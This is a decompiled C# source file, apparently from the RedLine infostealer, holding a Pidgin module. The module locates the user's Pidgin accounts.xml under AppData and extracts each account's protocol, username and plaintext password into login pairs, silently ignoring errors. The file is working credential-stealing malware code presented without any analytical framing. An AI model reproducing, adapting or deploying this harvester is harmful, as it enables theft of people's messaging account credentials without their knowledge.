using System;
using System.Collections.Generic;
using System.IO;
using System.Xml;
using RedLine.Models;

namespace RedLine.Logic.ImClient
{
	// Token: 0x02000059 RID: 89
	public static class Pidgin
	{
		// Token: 0x0600028B RID: 651 RVA: 0x0000A208 File Offset: 0x00008408
		public static List<LoginPair> ParseConnections()
		{
			List<LoginPair> list = new List<LoginPair>();
			try
			{
				string path = string.Format("{0}\\.purple\\accounts.xml", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
				if (File.Exists(path))
				{
					list.AddRange(Pidgin.ParseCredentials(path));
				}
			}
			catch
			{
			}
			return list;
		}

		// Token: 0x0600028C RID: 652 RVA: 0x0000A258 File Offset: 0x00008458
		private static List<LoginPair> ParseCredentials(string Path)
		{
			List<LoginPair> list = new List<LoginPair>();
			try
			{
				XmlTextReader reader = new XmlTextReader(Path);
				XmlDocument xmlDocument = new XmlDocument();
				xmlDocument.Load(reader);
				foreach (object obj in xmlDocument.DocumentElement.ChildNodes)
				{
					LoginPair loginPair = Pidgin.ParseAccounts((XmlNode)obj);
					if (loginPair.Login != "UNKNOWN" && loginPair.Host != "UNKNOWN")
					{
						list.Add(loginPair);
					}
				}
			}
			catch
			{
			}
			return list;
		}

		// Token: 0x0600028D RID: 653 RVA: 0x0000A30C File Offset: 0x0000850C
		private static LoginPair ParseAccounts(XmlNode xmlNode)
		{
			LoginPair loginPair = new LoginPair();
			try
			{
				foreach (object obj in xmlNode.ChildNodes)
				{
					XmlNode xmlNode2 = (XmlNode)obj;
					if (xmlNode2.Name == "protocol")
					{
						loginPair.Host = xmlNode2.InnerText;
					}
					if (xmlNode2.Name == "name")
					{
						loginPair.Login = xmlNode2.InnerText;
					}
					if (xmlNode2.Name == "password")
					{
						loginPair.Password = xmlNode2.InnerText;
					}
				}
			}
			catch
			{
			}
			finally
			{
				loginPair.Login = (string.IsNullOrEmpty(loginPair.Login) ? "UNKNOWN" : loginPair.Login);
				loginPair.Host = (string.IsNullOrEmpty(loginPair.Host) ? "UNKNOWN" : loginPair.Host);
				loginPair.Password = (string.IsNullOrEmpty(loginPair.Password) ? "UNKNOWN" : loginPair.Password);
			}
			return loginPair;
		}
	}
}
